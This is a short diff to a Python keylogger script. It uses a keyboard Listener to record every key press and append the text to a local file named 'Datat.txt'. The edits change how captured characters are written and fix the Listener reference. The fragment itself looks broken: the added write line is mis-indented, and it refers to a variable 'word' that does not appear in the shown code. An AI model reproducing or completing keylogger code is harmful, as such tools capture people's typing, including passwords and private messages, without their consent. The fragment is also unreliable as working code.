@@ -12,7 +12,8 @@ def write(key):
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
     with open('Datat.txt', 'a') as file:
-        file.write(keydata)
+            file.write("".join(word)+"\n")
+
         file.close()
 
 
@@ -41,6 +42,5 @@ def on_press(key):
 
 # Using Listener, everytime on_press is activated function write activates
 # This also joins the characters
-with Listener(on_press=on_press, on_release=write) as listener:
+with keyboard.Listener(on_press=on_press, on_release=write) as listener:
     listener.join()
-
